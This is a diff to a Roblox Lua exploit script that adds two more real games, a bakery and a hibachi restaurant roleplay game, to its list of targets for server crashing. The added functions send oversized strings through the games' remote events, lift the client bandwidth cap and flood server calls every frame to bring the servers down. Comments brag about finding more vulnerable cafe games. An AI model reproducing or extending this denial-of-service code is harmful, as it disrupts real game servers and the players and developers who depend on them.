@@ -28,6 +28,8 @@ _G.CrashSettings = {
 		4787647409, -- Blacksite Zeta [12] - patched?
 		6416498845, -- CL Facility Roleplay [13]
 		3226555017, -- SCP: Site Roleplay [14]
+		3243063589, -- Pastriez Bakery [15],
+		4375619868, -- Kohaú Hibachi Restaurant [16]
 	},
 	WhitelistedAccounts = { -- Incase of multi crashes at once
 		273336483, --RebeccaGordon3 -- idk ig banned
@@ -920,6 +922,61 @@ wait(1)
 	printconsole('Client did not crash server within 120 seconds of Get Request.')
 	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')
 
+end
+function C.K_3243063589()
+--Fun Fact: First game in around 6 months! 5/27/24
+-- One of the biggest cafe games on Roblox :3
+repeat wait() until game:IsLoaded()
+printconsole('Crashing..')
+
+printconsole('Sending request to game server... (This should not take long)')
+game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
+game:GetService('ReplicatedStorage'):FindFirstChild("TryToggleSetting", true):InvokeServer("ShiftLock", LongString)
+
+printconsole('Completed sending request...')
+printconsole('Attempting to crash...')
+
+game:GetService('RunService').RenderStepped:Connect(function()
+	for i = 1, 6500 do
+		for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
+			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
+			pcall(function()
+			game:GetService('ReplicatedStorage'):FindFirstChild("GetUserSettings", true):InvokeServer()
+			end)
+		end
+	end
+end)
+wait(120)
+printconsole('Client did not crash server within 120 seconds of Get Request.')
+game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')
+		
+end
+function C.K_4375619868()
+--ANother cafe game vuln to the same exploit the last 3 ^ above have 🤦
+repeat wait() until game:IsLoaded()
+printconsole('Crashing..')
+
+printconsole('Sending request to game server... (This should not take long)')
+game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
+game:GetService('ReplicatedStorage'):FindFirstChild("ToggleSetting", true):FireServer("DisableNPCVoice",LongString);
+
+printconsole('Completed sending request...')
+printconsole('Attempting to crash...')
+
+game:GetService('RunService').RenderStepped:Connect(function()
+	for i = 1, 6500 do
+		for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
+			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
+			pcall(function()
+			game:GetService("ReplicatedStorage").Packages.Knit.Services.SettingsService.RF.GetSettingValue:InvokeServer("DisableNPCVoice");
+			end)
+		end
+	end
+end)
+wait(120)
+printconsole('Client did not crash server within 120 seconds of Get Request.')
+game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')
+		
 end
 C.BasicSetup()
 C['K_'..game.PlaceId]()
